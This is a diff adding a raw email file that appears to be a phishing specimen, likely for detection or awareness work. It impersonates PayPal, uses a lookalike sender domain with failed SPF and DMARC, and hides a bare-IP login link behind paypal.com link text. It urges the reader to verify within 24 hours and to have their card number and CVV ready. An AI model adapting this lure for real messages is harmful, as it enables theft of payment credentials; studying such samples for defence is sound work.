@@ -1,0 +1,25 @@
+Return-Path: <root@vps-22817.cheaphost.example>
+Received: from vps-22817.cheaphost.example (unknown [203.0.113.45])
+	by mx.example-school.ac.za with ESMTP id 55ab0c
+	for <student@example-school.ac.za>; Tue, 15 Sep 2026 02:41:09 +0200
+Authentication-Results: mx.example-school.ac.za;
+	spf=fail smtp.mailfrom=paypa1-support.xyz;
+	dkim=none;
+	dmarc=fail header.from=paypa1-support.xyz
+From: "PayPal Service" <security@paypa1-support.xyz>
+Reply-To: paypal.resolution.team@gmail.com
+To: student@example-school.ac.za
+Subject: =?UTF-8?B?WW91ciBhY2NvdW50IGhhcyBiZWVuIGxpbWl0ZWQg4pqg77iP?=
+Date: Tue, 15 Sep 2026 02:40:55 +0200
+MIME-Version: 1.0
+Content-Type: text/html; charset=utf-8
+Content-Transfer-Encoding: 7bit
+
+<html><body>
+<p>Dear Customer,</p>
+<p>We noticed <b>unusual activity</b> on your PayPal account and it has been temporarily limited.</p>
+<p>To restore access you must <b>verify your account</b> within 24 hours, otherwise it will be closed permanently.</p>
+<p><a href="http://203.0.113.45/paypal/webscr/login.php?cmd=verify">https://www.paypal.com/signin</a></p>
+<p>Please have your card number and CVV ready.</p>
+<p>Thank you,<br>PayPal Security Team</p>
+</body></html>
